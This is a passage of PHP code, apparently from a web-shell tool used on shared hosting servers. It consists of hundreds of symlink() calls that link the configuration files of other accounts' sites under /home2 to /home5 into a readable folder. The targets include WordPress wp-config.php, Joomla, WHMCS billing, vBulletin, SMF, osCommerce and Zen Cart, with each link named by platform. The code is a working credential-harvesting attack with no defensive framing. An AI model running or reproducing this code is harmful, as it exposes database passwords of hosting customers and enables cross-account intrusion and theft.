symlink('/home2/'.$user.'/public_html/wp/beta/wp-config.php',$kola.' ~~ wp - beta - Wordpress.txt');
symlink('/home2/'.$user.'/public_html/beta/wp-config.php',$kola.' ~~ beta - Wordpress.txt');
symlink('/home2/'.$user.'/public_html/press/wp-config.php',$kola.' ~~ press - Wp13.txt');
symlink('/home2/'.$user.'/public_html/wordpress/wp-config.php',$kola.' ~~ wordpress - Wordpress.txt');
symlink('/home2/'.$user.'/public_html/wordpress/beta/wp-config.php',$kola.' ~~ wordpress - beta - Wordpress.txt');
symlink('/home2/'.$user.'/public_html/news/wp-config.php',$kola.' ~~ news - Wordpress.txt');
symlink('/home2/'.$user.'/public_html/new/wp-config.php',$kola.' ~~ new - Wordpress.txt');
symlink('/home2/'.$user.'/public_html/blogs/wp-config.php',$kola.' ~~ blog - Wordpress.txt');
symlink('/home2/'.$user.'/public_html/home/wp-config.php',$kola.' ~~ home - Wordpress.txt');
symlink('/home2/'.$user.'/public_html/portal/wp-config.php',$kola.' ~~ portal - Wordpres.txt');
symlink('/home2/'.$user.'/public_html/site/wp-config.php',$kola.' ~~ site - Wordpress.txt');
symlink('/home2/'.$user.'/public_html/main/wp-config.php',$kola.' ~~ main - Wordpress.txt');
symlink('/home2/'.$user.'/public_html/test/wp-config.php',$kola.' ~~ test - Wordpress.txt');
symlink('/home2/'.$user.'/public_html/SSI.php',$kola.' ~~ C M F .txt') ; 
symlink('/home2/'.$user.'/public_html/forum/SSI.php',$kola.' ~~ forum - C M F .txt') ; 
symlink('/home2/'.$user.'/public_html/system/sistem.php',$kola.' ~~ Lokomedia.txt'); 
symlink('/home2/'.$user.'/public_html/mk_conf.php',$kola.' ~~ mk-portale1.txt');
symlink('/home2/'.$user.'/public_html/includes/functions.php',$kola.' ~~ hpbb3.txt');
symlink('/home2/'.$user.'/public_html/include/db.php',$kola.' ~~ infinity.txt');
symlink('/home2/'.$user.'/public_html/conf_global.php',$kola.' ~~ invisio.txt');
symlink('/home2/'.$user.'/public_html/admin/config.php',$kola.' ~~ admin - OpenCart-4.txt') ;
symlink('/home3/'.$user.'/public_html/beta/configuration.php',$kola.' ~~ beta - Joomla.txt') ; 
symlink('/home3/'.$user.'/public_html/configuration.php',$kola.' ~~ joomla.txt') ; 
symlink('/home3/'.$user.'/public_html/includes/config.php',$kola.' ~~ vBulletin-2.txt') ; 
symlink('/home3/'.$user.'/public_html/home/configuration.php',$kola.' ~~ home - Joomla.txt') ;
symlink('/home3/'.$user.'/public_html/store/configuration.php',$kola.' ~~ store - Joomla.txt') ;
symlink('/home3/'.$user.'/public_html/joomla/configuration.php',$kola.' ~~ joomla - Joomla.txt');
symlink('/home3/'.$user.'/public_html/portal/configuration.php',$kola.' ~~ portal - Joomla.txt');
symlink('/home3/'.$user.'/public_html/joom/configuration.php',$kola.' ~~ joom - Joomla.txt');
symlink('/home3/'.$user.'/public_html/joo/configuration.php',$kola.' ~~ jom - Joomla.txt');
symlink('/home3/'.$user.'/public_html/cms/configuration.php',$kola.' ~~ cms - Joomla.txt');
symlink('/home3/'.$user.'/public_html/site/configuration.php',$kola.' ~~ site - Joomla.txt');
symlink('/home3/'.$user.'/public_html/main/configuration.php',$kola.' ~~ main - Joomla.txt');
symlink('/home3/'.$user.'/public_html/news/configuration.php',$kola.' ~~ news - Joomla.txt');
symlink('/home3/'.$user.'/public_html/new/configuration.php',$kola.' ~~ new - Joomla.txt');
symlink('/home3/'.$user.'/public_html/home/configuration.php',$kola.' ~~ home - Joomla.txt');
symlink('/home3/'.$user.'/public_html/test/configuration.php',$kola.' ~~ test - Joomla.txt');
symlink('/home3/'.$user.'/public_html/myshop/configuration.php',$kola.' ~~ myshop - Joomla.txt'); 
symlink('/home3/'.$user.'/public_html/Settings.php',$kola.' ~~ Smf.txt'); 
symlink('/home3/'.$user.'/public_html/smf/Settings.php',$kola.' ~~ smf - Smf.txt'); 
symlink('/home3/'.$user.'/public_html/forum/Settings.php',$kola.' ~~ forum - Smf.txt'); 
symlink('/home3/'.$user.'/public_html/forums/Settings.php',$kola.' ~~ forums - Smf.txt'); 
symlink('/home3/'.$user.'/public_html/sites/default/settings.php',$kola.' ~~ sites - default - configuration 3.txt');
symlink('/home3/'.$user.'/public_html/includes/dist-configure.php',$kola.' ~~ Zencart.txt'); 
symlink('/home3/'.$user.'/public_html/zencart/includes/dist-configure.php',$kola.' ~~ zencart - zencart.txt'); 
symlink('/home3/'.$user.'/public_html/shop/includes/dist-configure.php',$kola.' ~~ shop - zencart.txt'); 
symlink('/home3/'.$user.'/public_html/includes/configure.php',$kola.' ~~ Oscommerce.txt');
symlink('/home3/'.$user.'/public_html/oscommerce/includes/configure.php',$kola.' ~~ oscommerce - Oscommerce.txt');
symlink('/home3/'.$user.'/public_html/oscommerces/includes/configure.php',$kola.' ~~ oscommerces -Oscommerces.txt');
symlink('/home3/'.$user.'/public_html/shopping/includes/configure.php',$kola.' ~~ shopping - Shopping.txt');
symlink('/home3/'.$user.'/public_html/sale/includes/configure.php',$kola.' ~~ sale - Oscommerce.txt');
symlink('/home3/'.$user.'/public_html/store/includes/configure.php',$kola.' ~~ store - Oscommerce.txt');
symlink('/home3/'.$user.'/public_html/inc/config.php',$kola.' ~~ MyBB.txt') ;
symlink('/home3/'.$user.'/public_html/forum/inc/config.php',$kola.' ~~ forum - MyBB .txt') ;
symlink('/home3/'.$user.'/public_html/lib/config.php',$kola.' ~~ Balitbang.txt') ; 
symlink('/home3/'.$user.'/public_html/cc/includes/config.php',$kola.' ~~ VBulletin4.txt');
symlink('/home3/'.$user.'/public_html/forum/includes/config.php',$kola.' ~~ forum - vBulletin.txt');
symlink('/home3/'.$user.'/public_html/forum/config.php',$kola.' ~~ forum - PhpBB.txt') ;
symlink('/home3/'.$user.'/public_html/amember/config.inc.php',$kola.' ~~ Amember.txt');
symlink('/home3/'.$user.'/public_html/config.inc.php',$kola.' ~~ Amember2.txt');
symlink('/home3/'.$user.'/public_html/vb/includes/config.php',$kola.' ~~ Vb.txt');
symlink('/home3/'.$user.'/public_html/vb3/includes/config.php',$kola.' ~~ Vb3.txt');
symlink('/home3/'.$user.'/public_html/upload/includes/config.php',$kola.' ~~ Upload.txt');
symlink('/home3/'.$user.'/public_html/incl/config.php',$kola.' ~~ Malay.txt');
symlink('/home3/'.$user.'/public_html/config/koneksi.php',$kola.' ~~ Lokomedia.txt');
symlink('/home3/'.$user.'/public_html/config/config.php',$kola.' ~~ config.txt');
symlink('/home3/'.$user.'/public_html/datas/config.php',$kola.' ~~ datas - configuration 3.txt');
symlink('/home3/'.$user.'/public_html/forum/conf/config.php',$kola.' ~~ forum - Other-1.txt') ; 
symlink('/home3/'.$user.'/public_html/include/config.php',$kola.' ~~ Other-2.txt');
symlink('/home3/'.$user.'/public_html/config.php',$kola.' ~~ Other-3.txt') ;
symlink('/home3/'.$user.'/public_html/admin/conf.php',$kola.' ~~ admin - Other-4.txt');
symlink('/home3/'.$user.'/public_html/connect.php',$kola.' ~~ Other-5.txt');
symlink('/home3/'.$user.'/public_html/codelibrary/inc/variables.php',$kola.' ~~ Other-6.txt') ;
symlink('/home3/'.$user.'/public_html/client/configuration.php',$kola.' ~~ client - admin Whm1.txt') ; 
symlink('/home3/'.$user.'/public_html/clients/configuration.php',$kola.' ~~ clients - Whm2.txt') ; 
symlink('/home3/'.$user.'/public_html/billing/configuration.php',$kola.' ~~ billing - Whm3.txt') ; 
symlink('/home3/'.$user.'/public_html/billings/configuration.php',$kola.' ~~ Whm4.txt') ;
symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$kola.' ~~ whmcs - Whm5.txt') ; 
symlink('/home3/'.$user.'/public_html/whm/configuration.php',$kola.' ~~ whm - Whm6.txt');
symlink('/home3/'.$user.'/public_html/order/configuration.php',$kola.' ~~ order - Whm7.txt');
symlink('/home3/'.$user.'/public_html/whmc/configuration.php',$kola.' ~~ whmc - Whm8.txt');
symlink('/home3/'.$user.'/public_html/submitticket.php',$kola.' ~~ whm9.txt');
symlink('/home3/'.$user.'/public_html/manage/configuration.php',$kola.' ~~ manage -Whm10.txt'); 
symlink('/home3/'.$user.'/public_html/clientes/configuration.php',$kola.' ~~ clientes - Whm11.txt');
symlink('/home3/'.$user.'/public_html/cliente/configuration.php',$kola.' ~~ cliente - Whm12txt');
symlink('/home3/'.$user.'/public_html/clientsupport/configuration.php',$kola.' ~~ clientsupport - Whm13.txt');
symlink('/home3/'.$user.'/public_html/support/configuration.php',$kola.' ~~ support - Whm13.txt');
symlink('/home3/'.$user.'/public_html/supports/configuration.php',$kola.' ~~ supports - Whm14.txt');
symlink('/home3/'.$user.'/public_html/cpanel/configuration.php',$kola.' ~~ cpanel - Whm15');
symlink('/home3/'.$user.'/public_html/panel/configuration.php',$kola.' ~~ panel - Whm16');
symlink('/home3/'.$user.'/public_html/host/configuration.php',$kola.' ~~ host - Whm17');
symlink('/home3/'.$user.'/public_html/hosting/configuration.php',$kola.' ~~ hosting - Whm18');
symlink('/home3/'.$user.'/public_html/hosts/configuration.php',$kola.' ~~ hosts - Whm19');
symlink('/home3/'.$user.'/public_html/v1/configuration.php',$kola.' ~~ v1 - Whm20');
symlink('/home3/'.$user.'/public_html/v2/configuration.php',$kola.' ~~ v2 - Whm21');
symlink('/home3/'.$user.'/public_html/baru/configuration.php',$kola.' ~~ v2 - Whm22');
symlink('/home3/'.$user.'/public_html/wp-config.php',$kola.' ~~ Wordpress.txt') ; 
symlink('/home3/'.$user.'/public_html/blog/wp-config.php',$kola.' ~~ Wordpress.txt') ; 
symlink('/home3/'.$user.'/public_html/Connections/cms_blog.php',$kola.' ~~ admin - cms_blog.txt') ; 
symlink('/home3/'.$user.'/public_html/web/wp-config.php',$kola.' ~~ web - Wordpress .txt') ; 
symlink('/home3/'.$user.'/public_html/welcome/wp-config.php',$kola.' ~~ welcome - Wordpress .txt') ; 
symlink('/home3/'.$user.'/public_html/store/wp-config.php',$kola.' ~~ store - Wordpress .txt') ; 
symlink('/home3/'.$user.'/public_html/wp/wp-config.php',$kola.' ~~ wp - Wordpress.txt');
symlink('/home3/'.$user.'/public_html/wp/beta/wp-config.php',$kola.' ~~ wp - beta - Wordpress.txt');
symlink('/home3/'.$user.'/public_html/beta/wp-config.php',$kola.' ~~ beta - Wordpress.txt');
symlink('/home3/'.$user.'/public_html/press/wp-config.php',$kola.' ~~ press - Wp13.txt');
symlink('/home3/'.$user.'/public_html/wordpress/wp-config.php',$kola.' ~~ wordpress - Wordpress.txt');
symlink('/home3/'.$user.'/public_html/wordpress/beta/wp-config.php',$kola.' ~~ wordpress - beta - Wordpress.txt');
symlink('/home3/'.$user.'/public_html/news/wp-config.php',$kola.' ~~ news - Wordpress.txt');
symlink('/home3/'.$user.'/public_html/new/wp-config.php',$kola.' ~~ new - Wordpress.txt');
symlink('/home3/'.$user.'/public_html/blogs/wp-config.php',$kola.' ~~ blog - Wordpress.txt');
symlink('/home3/'.$user.'/public_html/home/wp-config.php',$kola.' ~~ home - Wordpress.txt');
symlink('/home3/'.$user.'/public_html/portal/wp-config.php',$kola.' ~~ portal - Wordpres.txt');
symlink('/home3/'.$user.'/public_html/site/wp-config.php',$kola.' ~~ site - Wordpress.txt');
symlink('/home3/'.$user.'/public_html/main/wp-config.php',$kola.' ~~ main - Wordpress.txt');
symlink('/home3/'.$user.'/public_html/test/wp-config.php',$kola.' ~~ test - Wordpress.txt');
symlink('/home3/'.$user.'/public_html/SSI.php',$kola.' ~~ C M F .txt') ; 
symlink('/home3/'.$user.'/public_html/forum/SSI.php',$kola.' ~~ forum - C M F .txt') ; 
symlink('/home3/'.$user.'/public_html/system/sistem.php',$kola.' ~~ Lokomedia.txt'); 
symlink('/home3/'.$user.'/public_html/mk_conf.php',$kola.' ~~ mk-portale1.txt');
symlink('/home3/'.$user.'/public_html/includes/functions.php',$kola.' ~~ hpbb3.txt');
symlink('/home3/'.$user.'/public_html/include/db.php',$kola.' ~~ infinity.txt');
symlink('/home3/'.$user.'/public_html/conf_global.php',$kola.' ~~ invisio.txt');
symlink('/home3/'.$user.'/public_html/admin/config.php',$kola.' ~~ admin - OpenCart-4.txt') ;
symlink('/home4/'.$user.'/public_html/beta/configuration.php',$kola.' ~~ beta - Joomla.txt') ; 
symlink('/home4/'.$user.'/public_html/configuration.php',$kola.' ~~ joomla.txt') ; 
symlink('/home4/'.$user.'/public_html/includes/config.php',$kola.' ~~ vBulletin-2.txt') ; 
symlink('/home4/'.$user.'/public_html/home/configuration.php',$kola.' ~~ home - Joomla.txt') ;
symlink('/home4/'.$user.'/public_html/store/configuration.php',$kola.' ~~ store - Joomla.txt') ;
symlink('/home4/'.$user.'/public_html/joomla/configuration.php',$kola.' ~~ joomla - Joomla.txt');
symlink('/home4/'.$user.'/public_html/portal/configuration.php',$kola.' ~~ portal - Joomla.txt');
symlink('/home4/'.$user.'/public_html/joom/configuration.php',$kola.' ~~ joom - Joomla.txt');
symlink('/home4/'.$user.'/public_html/joo/configuration.php',$kola.' ~~ jom - Joomla.txt');
symlink('/home4/'.$user.'/public_html/cms/configuration.php',$kola.' ~~ cms - Joomla.txt');
symlink('/home4/'.$user.'/public_html/site/configuration.php',$kola.' ~~ site - Joomla.txt');
symlink('/home4/'.$user.'/public_html/main/configuration.php',$kola.' ~~ main - Joomla.txt');
symlink('/home4/'.$user.'/public_html/news/configuration.php',$kola.' ~~ news - Joomla.txt');
symlink('/home4/'.$user.'/public_html/new/configuration.php',$kola.' ~~ new - Joomla.txt');
symlink('/home4/'.$user.'/public_html/home/configuration.php',$kola.' ~~ home - Joomla.txt');
symlink('/home4/'.$user.'/public_html/test/configuration.php',$kola.' ~~ test - Joomla.txt');
symlink('/home4/'.$user.'/public_html/myshop/configuration.php',$kola.' ~~ myshop - Joomla.txt'); 
symlink('/home4/'.$user.'/public_html/Settings.php',$kola.' ~~ Smf.txt'); 
symlink('/home4/'.$user.'/public_html/smf/Settings.php',$kola.' ~~ smf - Smf.txt'); 
symlink('/home4/'.$user.'/public_html/forum/Settings.php',$kola.' ~~ forum - Smf.txt'); 
symlink('/home4/'.$user.'/public_html/forums/Settings.php',$kola.' ~~ forums - Smf.txt'); 
symlink('/home4/'.$user.'/public_html/sites/default/settings.php',$kola.' ~~ sites - default - configuration 3.txt');
symlink('/home4/'.$user.'/public_html/includes/dist-configure.php',$kola.' ~~ Zencart.txt'); 
symlink('/home4/'.$user.'/public_html/zencart/includes/dist-configure.php',$kola.' ~~ zencart - zencart.txt'); 
symlink('/home4/'.$user.'/public_html/shop/includes/dist-configure.php',$kola.' ~~ shop - zencart.txt'); 
symlink('/home4/'.$user.'/public_html/includes/configure.php',$kola.' ~~ Oscommerce.txt');
symlink('/home4/'.$user.'/public_html/oscommerce/includes/configure.php',$kola.' ~~ oscommerce - Oscommerce.txt');
symlink('/home4/'.$user.'/public_html/oscommerces/includes/configure.php',$kola.' ~~ oscommerces -Oscommerces.txt');
symlink('/home4/'.$user.'/public_html/shopping/includes/configure.php',$kola.' ~~ shopping - Shopping.txt');
symlink('/home4/'.$user.'/public_html/sale/includes/configure.php',$kola.' ~~ sale - Oscommerce.txt');
symlink('/home4/'.$user.'/public_html/store/includes/configure.php',$kola.' ~~ store - Oscommerce.txt');
symlink('/home4/'.$user.'/public_html/inc/config.php',$kola.' ~~ MyBB.txt') ;
symlink('/home4/'.$user.'/public_html/forum/inc/config.php',$kola.' ~~ forum - MyBB .txt') ;
symlink('/home4/'.$user.'/public_html/lib/config.php',$kola.' ~~ Balitbang.txt') ; 
symlink('/home4/'.$user.'/public_html/cc/includes/config.php',$kola.' ~~ VBulletin4.txt');
symlink('/home4/'.$user.'/public_html/forum/includes/config.php',$kola.' ~~ forum - vBulletin.txt');
symlink('/home4/'.$user.'/public_html/forum/config.php',$kola.' ~~ forum - PhpBB.txt') ;
symlink('/home4/'.$user.'/public_html/amember/config.inc.php',$kola.' ~~ Amember.txt');
symlink('/home4/'.$user.'/public_html/config.inc.php',$kola.' ~~ Amember2.txt');
symlink('/home4/'.$user.'/public_html/vb/includes/config.php',$kola.' ~~ Vb.txt');
symlink('/home4/'.$user.'/public_html/vb3/includes/config.php',$kola.' ~~ Vb3.txt');
symlink('/home4/'.$user.'/public_html/upload/includes/config.php',$kola.' ~~ Upload.txt');
symlink('/home4/'.$user.'/public_html/incl/config.php',$kola.' ~~ Malay.txt');
symlink('/home4/'.$user.'/public_html/config/koneksi.php',$kola.' ~~ Lokomedia.txt');
symlink('/home4/'.$user.'/public_html/config/config.php',$kola.' ~~ Lokomedia.txt');
symlink('/home4/'.$user.'/public_html/datas/config.php',$kola.' ~~ datas - configuration 3.txt');
symlink('/home4/'.$user.'/public_html/forum/conf/config.php',$kola.' ~~ forum - Other-1.txt') ; 
symlink('/home4/'.$user.'/public_html/include/config.php',$kola.' ~~ Other-2.txt');
symlink('/home4/'.$user.'/public_html/config.php',$kola.' ~~ Other-3.txt') ;
symlink('/home4/'.$user.'/public_html/admin/conf.php',$kola.' ~~ admin - Other-4.txt');
symlink('/home4/'.$user.'/public_html/connect.php',$kola.' ~~ Other-5.txt');
symlink('/home4/'.$user.'/public_html/codelibrary/inc/variables.php',$kola.' ~~ Other-6.txt') ;
symlink('/home4/'.$user.'/public_html/client/configuration.php',$kola.' ~~ client - admin Whm1.txt') ; 
symlink('/home4/'.$user.'/public_html/clients/configuration.php',$kola.' ~~ clients - Whm2.txt') ; 
symlink('/home4/'.$user.'/public_html/billing/configuration.php',$kola.' ~~ billing - Whm3.txt') ; 
symlink('/home4/'.$user.'/public_html/billings/configuration.php',$kola.' ~~ Whm4.txt') ;
symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$kola.' ~~ whmcs - Whm5.txt') ; 
symlink('/home4/'.$user.'/public_html/whm/configuration.php',$kola.' ~~ whm - Whm6.txt');
symlink('/home4/'.$user.'/public_html/order/configuration.php',$kola.' ~~ order - Whm7.txt');
symlink('/home4/'.$user.'/public_html/whmc/configuration.php',$kola.' ~~ whmc - Whm8.txt');
symlink('/home4/'.$user.'/public_html/submitticket.php',$kola.' ~~ whm9.txt');
symlink('/home4/'.$user.'/public_html/manage/configuration.php',$kola.' ~~ manage -Whm10.txt'); 
symlink('/home4/'.$user.'/public_html/clientes/configuration.php',$kola.' ~~ clientes - Whm11.txt');
symlink('/home4/'.$user.'/public_html/cliente/configuration.php',$kola.' ~~ cliente - Whm12txt');
symlink('/home4/'.$user.'/public_html/clientsupport/configuration.php',$kola.' ~~ clientsupport - Whm13.txt');
symlink('/home4/'.$user.'/public_html/support/configuration.php',$kola.' ~~ support - Whm13.txt');
symlink('/home4/'.$user.'/public_html/supports/configuration.php',$kola.' ~~ supports - Whm14.txt');
symlink('/home4/'.$user.'/public_html/cpanel/configuration.php',$kola.' ~~ cpanel - Whm15');
symlink('/home4/'.$user.'/public_html/panel/configuration.php',$kola.' ~~ panel - Whm16');
symlink('/home4/'.$user.'/public_html/host/configuration.php',$kola.' ~~ host - Whm17');
symlink('/home4/'.$user.'/public_html/hosting/configuration.php',$kola.' ~~ hosting - Whm18');
symlink('/home4/'.$user.'/public_html/hosts/configuration.php',$kola.' ~~ hosts - Whm19');
symlink('/home4/'.$user.'/public_html/v1/configuration.php',$kola.' ~~ v1 - Whm20');
symlink('/home4/'.$user.'/public_html/v2/configuration.php',$kola.' ~~ v2 - Whm21');
symlink('/home4/'.$user.'/public_html/baru/configuration.php',$kola.' ~~ v2 - Whm22');
symlink('/home4/'.$user.'/public_html/wp-config.php',$kola.' ~~ Wordpress.txt') ; 
symlink('/home4/'.$user.'/public_html/blog/wp-config.php',$kola.' ~~ Wordpress.txt') ; 
symlink('/home4/'.$user.'/public_html/Connections/cms_blog.php',$kola.' ~~ admin - cms_blog.txt') ; 
symlink('/home4/'.$user.'/public_html/web/wp-config.php',$kola.' ~~ web - Wordpress .txt') ; 
symlink('/home4/'.$user.'/public_html/welcome/wp-config.php',$kola.' ~~ welcome - Wordpress .txt') ; 
symlink('/home4/'.$user.'/public_html/store/wp-config.php',$kola.' ~~ store - Wordpress .txt') ; 
symlink('/home4/'.$user.'/public_html/wp/wp-config.php',$kola.' ~~ wp - Wordpress.txt');
symlink('/home4/'.$user.'/public_html/wp/beta/wp-config.php',$kola.' ~~ wp - beta - Wordpress.txt');
symlink('/home4/'.$user.'/public_html/beta/wp-config.php',$kola.' ~~ beta - Wordpress.txt');
symlink('/home4/'.$user.'/public_html/press/wp-config.php',$kola.' ~~ press - Wp13.txt');
symlink('/home4/'.$user.'/public_html/wordpress/wp-config.php',$kola.' ~~ wordpress - Wordpress.txt');
symlink('/home4/'.$user.'/public_html/wordpress/beta/wp-config.php',$kola.' ~~ wordpress - beta - Wordpress.txt');
symlink('/home4/'.$user.'/public_html/news/wp-config.php',$kola.' ~~ news - Wordpress.txt');
symlink('/home4/'.$user.'/public_html/new/wp-config.php',$kola.' ~~ new - Wordpress.txt');
symlink('/home4/'.$user.'/public_html/blogs/wp-config.php',$kola.' ~~ blog - Wordpress.txt');
symlink('/home4/'.$user.'/public_html/home/wp-config.php',$kola.' ~~ home - Wordpress.txt');
symlink('/home4/'.$user.'/public_html/portal/wp-config.php',$kola.' ~~ portal - Wordpres.txt');
symlink('/home4/'.$user.'/public_html/site/wp-config.php',$kola.' ~~ site - Wordpress.txt');
symlink('/home4/'.$user.'/public_html/main/wp-config.php',$kola.' ~~ main - Wordpress.txt');
symlink('/home4/'.$user.'/public_html/test/wp-config.php',$kola.' ~~ test - Wordpress.txt');
symlink('/home4/'.$user.'/public_html/SSI.php',$kola.' ~~ C M F .txt') ; 
symlink('/home4/'.$user.'/public_html/forum/SSI.php',$kola.' ~~ forum - C M F .txt') ; 
symlink('/home4/'.$user.'/public_html/system/sistem.php',$kola.' ~~ Lokomedia.txt'); 
symlink('/home4/'.$user.'/public_html/mk_conf.php',$kola.' ~~ mk-portale1.txt');
symlink('/home4/'.$user.'/public_html/includes/functions.php',$kola.' ~~ hpbb3.txt');
symlink('/home4/'.$user.'/public_html/include/db.php',$kola.' ~~ infinity.txt');
symlink('/home4/'.$user.'/public_html/conf_global.php',$kola.' ~~ invisio.txt');
symlink('/home4/'.$user.'/public_html/admin/config.php',$kola.' ~~ admin - OpenCart-4.txt') ;
symlink('/home5/'.$user.'/public_html/beta/configuration.php',$kola.' ~~ beta - Joomla.txt') ; 
symlink('/home5/'.$user.'/public_html/configuration.php',$kola.' ~~ joomla.txt') ; 
symlink('/home5/'.$user.'/public_html/includes/config.php',$kola.' ~~ vBulletin-2.txt') ; 
symlink('/home5/'.$user.'/public_html/home/configuration.php',$kola.' ~~ home - Joomla.txt') ;
symlink('/home5/'.$user.'/public_html/store/configuration.php',$kola.' ~~ store - Joomla.txt') ;
symlink('/home5/'.$user.'/public_html/joomla/configuration.php',$kola.' ~~ joomla - Joomla.txt');
symlink('/home5/'.$user.'/public_html/portal/configuration.php',$kola.' ~~ portal - Joomla.txt');
symlink('/home5/'.$user.'/public_html/joom/configuration.php',$kola.' ~~ joom - Joomla.txt');
symlink('/home5/'.$user.'/public_html/joo/configuration.php',$kola.' ~~ jom - Joomla.txt');
symlink('/home5/'.$user.'/public_html/cms/configuration.php',$kola.' ~~ cms - Joomla.txt');
symlink('/home5/'.$user.'/public_html/site/configuration.php',$kola.' ~~ site - Joomla.txt');
symlink('/home5/'.$user.'/public_html/main/configuration.php',$kola.' ~~ main - Joomla.txt');
symlink('/home5/'.$user.'/public_html/news/configuration.php',$kola.' ~~ news - Joomla.txt');
symlink('/home5/'.$user.'/public_html/new/configuration.php',$kola.' ~~ new - Joomla.txt');
symlink('/home5/'.$user.'/public_html/home/configuration.php',$kola.' ~~ home - Joomla.txt');
symlink('/home5/'.$user.'/public_html/test/configuration.php',$kola.' ~~ test - Joomla.txt');
symlink('/home5/'.$user.'/public_html/myshop/configuration.php',$kola.' ~~ myshop - Joomla.txt'); 
symlink('/home5/'.$user.'/public_html/Settings.php',$kola.' ~~ Smf.txt'); 
symlink('/home5/'.$user.'/public_html/smf/Settings.php',$kola.' ~~ smf - Smf.txt'); 
symlink('/home5/'.$user.'/public_html/forum/Settings.php',$kola.' ~~ forum - Smf.txt'); 
symlink('/home5/'.$user.'/public_html/forums/Settings.php',$kola.' ~~ forums - Smf.txt'); 
symlink('/home5/'.$user.'/public_html/sites/default/settings.php',$kola.' ~~ sites - default - configuration 3.txt');
symlink('/home5/'.$user.'/public_html/includes/dist-configure.php',$kola.' ~~ Zencart.txt'); 
symlink('/home5/'.$user.'/public_html/zencart/includes/dist-configure.php',$kola.' ~~ zencart - zencart.txt'); 
symlink('/home5/'.$user.'/public_html/shop/includes/dist-configure.php',$kola.' ~~ shop - zencart.txt'); 
symlink('/home5/'.$user.'/public_html/includes/configure.php',$kola.' ~~ Oscommerce.txt');
symlink('/home5/'.$user.'/public_html/oscommerce/includes/configure.php',$kola.' ~~ oscommerce - Oscommerce.txt');
symlink('/home5/'.$user.'/public_html/oscommerces/includes/configure.php',$kola.' ~~ oscommerces -Oscommerces.txt');
symlink('/home5/'.$user.'/public_html/shopping/includes/configure.php',$kola.' ~~ shopping - Shopping.txt');
symlink('/home5/'.$user.'/public_html/sale/includes/configure.php',$kola.' ~~ sale - Oscommerce.txt');
symlink('/home5/'.$user.'/public_html/store/includes/configure.php',$kola.' ~~ store - Oscommerce.txt');
symlink('/home5/'.$user.'/public_html/inc/config.php',$kola.' ~~ MyBB.txt') ;
symlink('/home5/'.$user.'/public_html/forum/inc/config.php',$kola.' ~~ forum - MyBB .txt') ;
symlink('/home5/'.$user.'/public_html/lib/config.php',$kola.' ~~ Balitbang.txt') ; 
symlink('/home5/'.$user.'/public_html/cc/includes/config.php',$kola.' ~~ VBulletin4.txt');
symlink('/home5/'.$user.'/public_html/forum/includes/config.php',$kola.' ~~ forum - vBulletin.txt');
symlink('/home5/'.$user.'/public_html/forum/config.php',$kola.' ~~ forum - PhpBB.txt') ;
symlink('/home5/'.$user.'/public_html/amember/config.inc.php',$kola.' ~~ Amember.txt');
symlink('/home5/'.$user.'/public_html/config.inc.php',$kola.' ~~ Amember2.txt');
symlink('/home5/'.$user.'/public_html/vb/includes/config.php',$kola.' ~~ Vb.txt');
symlink('/home5/'.$user.'/public_html/vb3/includes/config.php',$kola.' ~~ Vb3.txt');
symlink('/home5/'.$user.'/public_html/upload/includes/config.php',$kola.' ~~ Upload.txt');
symlink('/home5/'.$user.'/public_html/incl/config.php',$kola.' ~~ Malay.txt');
symlink('/home5/'.$user.'/public_html/config/koneksi.php',$kola.' ~~ Lokomedia.txt');
symlink('/home5/'.$user.'/public_html/config/config.php',$kola.' ~~ config.txt');
symlink('/home5/'.$user.'/public_html/datas/config.php',$kola.' ~~ datas - configuration 3.txt');
symlink('/home5/'.$user.'/public_html/forum/conf/config.php',$kola.' ~~ forum - Other-1.txt') ; 
symlink('/home5/'.$user.'/public_html/include/config.php',$kola.' ~~ Other-2.txt');
symlink('/home5/'.$user.'/public_html/config.php',$kola.' ~~ Other-3.txt') ;
symlink('/home5/'.$user.'/public_html/admin/conf.php',$kola.' ~~ admin - Other-4.txt');
symlink('/home5/'.$user.'/public_html/connect.php',$kola.' ~~ Other-5.txt');
symlink('/home5/'.$user.'/public_html/codelibrary/inc/variables.php',$kola.' ~~ Other-6.txt') ;
symlink('/home5/'.$user.'/public_html/client/configuration.php',$kola.' ~~ client - admin Whm1.txt') ; 
symlink('/home5/'.$user.'/public_html/clients/configuration.php',$kola.' ~~ clients - Whm2.txt') ; 
symlink('/home5/'.$user.'/public_html/billing/configuration.php',$kola.' ~~ billing - Whm3.txt') ; 
symlink('/home5/'.$user.'/public_html/billings/configuration.php',$kola.' ~~ Whm4.txt') ;
symlink('/home5/'.$user.'/public_html/whmcs/configuration.php',$kola.' ~~ whmcs - Whm5.txt') ; 
symlink('/home5/'.$user.'/public_html/whm/configuration.php',$kola.' ~~ whm - Whm6.txt');
symlink('/home5/'.$user.'/public_html/order/configuration.php',$kola.' ~~ order - Whm7.txt');
symlink('/home5/'.$user.'/public_html/whmc/configuration.php',$kola.' ~~ whmc - Whm8.txt');
symlink('/home5/'.$user.'/public_html/submitticket.php',$kola.' ~~ whm9.txt');
symlink('/home5/'.$user.'/public_html/manage/configuration.php',$kola.' ~~ manage -Whm10.txt'); 
symlink('/home5/'.$user.'/public_html/clientes/configuration.php',$kola.' ~~ clientes - Whm11.txt');
symlink('/home5/'.$user.'/public_html/cliente/configuration.php',$kola.' ~~ cliente - Whm12txt');
symlink('/home5/'.$user.'/public_html/clientsupport/configuration.php',$kola.' ~~ clientsupport - Whm13.txt');
symlink('/home5/'.$user.'/public_html/support/configuration.php',$kola.' ~~ support - Whm13.txt');
symlink('/home5/'.$user.'/public_html/supports/configuration.php',$kola.' ~~ supports - Whm14.txt');
symlink('/home5/'.$user.'/public_html/cpanel/configuration.php',$kola.' ~~ cpanel - Whm15');
symlink('/home5/'.$user.'/public_html/panel/configuration.php',$kola.' ~~ panel - Whm16');
symlink('/home5/'.$user.'/public_html/host/configuration.php',$kola.' ~~ host - Whm17');
symlink('/home5/'.$user.'/public_html/hosting/configuration.php',$kola.' ~~ hosting - Whm18');
symlink('/home5/'.$user.'/public_html/hosts/configuration.php',$kola.' ~~ hosts - Whm19');
symlink('/home5/'.$user.'/public_html/v1/configuration.php',$kola.' ~~ v1 - Whm20');
symlink('/home5/'.$user.'/public_html/v2/configuration.php',$kola.' ~~ v2 - Whm21');
symlink('/home5/'.$user.'/public_html/baru/configuration.php',$kola.' ~~ v2 - Whm22');
symlink('/home5/'.$user.'/public_html/wp-config.php',$kola.' ~~ Wordpress.txt') ; 
symlink('/home5/'.$user.'/public_html/blog/wp-config.php',$kola.' ~~ Wordpress.txt') ; 
